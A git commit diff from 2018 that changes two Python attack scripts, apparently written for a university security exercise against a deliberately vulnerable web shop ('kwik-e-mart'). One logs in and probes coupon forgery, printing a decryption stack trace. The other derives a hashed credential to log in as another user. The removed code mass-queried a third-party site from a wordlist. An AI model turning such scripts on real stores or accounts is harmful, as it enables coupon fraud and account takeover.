d1d1a2d8f9920aabe4d40c8d496524aa303b3575
hingston <will.hingston@gmail.com>
2018-07-04 20:35:21 +0930

    Progress

--- Forged Coupon.py
+++ Forged Coupon.py
@@ -1,25 +1,24 @@
-import random
-from multiprocessing.pool import ThreadPool
+import json
 
 import requests
 
 s = requests.Session()
 
-with open("./wordlist.txt") as f:
-    names = f.readlines()
-names = [x.strip() for x in names]
+r = s.post(
+    'http://43.241.202.47:3003/rest/user/login',
+    data=json.dumps({
+        "email": 'a1644290@student.adelaide.edu.au',
+        "password": 'qwerty',
+    }),
+    headers={'Content-type': 'application/json;charset=utf-8'},
+)
 
+print("Login:", r)
 
-def check_name(id):
-    r = s.post(
-        'http://lolinactive.com/LoLInactive.php',
-        data={"region": 'ru', "summonerName": random.choice(names)},
-        headers={'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'},
-    )
-    print(r.text)
-    print(r)
+s.headers.update({'Authorization': "Bearer " + json.loads(r.text)['authentication']['token']})
 
+r = s.put('http://43.241.202.47:3003/rest/basket/73/coupon/test')
 
-for _ in range(100):
-    with ThreadPool(20) as p:
-        p.map(check_name, range(200))
+print(r.text)
+
+print("Error: error:0606506D:digital envelope routines:EVP_DecryptFinal_ex:wrong final block length\n at Decipher.final (internal/crypto/cipher.js:104:26)\n at Cryptr.decrypt (/opt/kwik-e-mart/node_modules/cryptr/index.js:34:59)\n at Object.exports.discountFromCoupon.coupon [as discountFromCoupon] (/opt/kwik-e-mart/lib/insecurity.js:65:36)\n at /opt/kwik-e-mart/routes/coupon.js:8:33\n at Layer.handle [as handle_request] (/opt/kwik-e-mart/node_modules/express/lib/router/layer.js:95:5)\n at next (/opt/kwik-e-mart/node_modules/express/lib/router/route.js:137:13)\n at Route.dispatch (/opt/kwik-e-mart/node_modules/express/lib/router/route.js:112:3)\n at Layer.handle [as handle_request] (/opt/kwik-e-mart/node_modules/express/lib/router/layer.js:95:5)\n at /opt/kwik-e-mart/node_modules/express/lib/router/index.js:281:22\n at param (/opt/kwik-e-mart/node_modules/express/lib/router/index.js:354:14)\n at param (/opt/kwik-e-mart/node_modules/express/lib/router/index.js:365:14)\n at param (/opt/kwik-e-mart/node_modules/express/lib/router/index.js:365:14)\n at Function.process_params (/opt/kwik-e-mart/node_modules/express/lib/router/index.js:410:3)\n at next (/opt/kwik-e-mart/node_modules/express/lib/router/index.js:275:10)\n at /opt/kwik-e-mart/routes/verify.js:124:3\n at Layer.handle [as handle_request] (/opt/kwik-e-mart/node_modules/express/lib/router/layer.js:95:5)\n at trim_prefix (/opt/kwik-e-mart/node_modules/express/lib/router/index.js:317:13)\n at /opt/kwik-e-mart/node_modules/express/lib/router/index.js:284:7\n at Function.process_params (/opt/kwik-e-mart/node_modules/express/lib/router/index.js:335:12)\n at next (/opt/kwik-e-mart/node_modules/express/lib/router/index.js:275:10)\n at /opt/kwik-e-mart/node_modules/express-jwt/lib/index.js:44:7\n at Object.module.exports.verify (/opt/kwik-e-mart/node_modules/express-jwt/node_modules/jsonwebtoken/index.js:59:3)")
--- Maggie Password.py
+++ Maggie Password.py
@@ -8,19 +8,18 @@ import requests
 email = "Maggie.Simpson@googlemail.com"
 
 
-def encode(str):
-    return base64.b64encode(str.encode('utf-8')).decode("utf-8")
+def encode(string):
+    return base64.b64encode(string.encode('utf-8')).decode("utf-8")
 
 
-str = (encode("H4hgvh5GvG5lkcbo") + ":" + encode(email))
-str = str.encode('utf-8')
+s = (encode("H4hgvh5GvG5lkcbo") + ":" + encode(email))
+s = s.encode('utf-8')
 
-hash_object = hashlib.sha512(str)
+hash_object = hashlib.md5(s)
 hex_dig = hash_object.hexdigest()
+print(s)
 print(hash_object)
 print(hex_dig)
-
-print(str.decode("utf-8"))
 
 r = requests.post(
     'http://43.241.202.33:3003/rest/user/login',
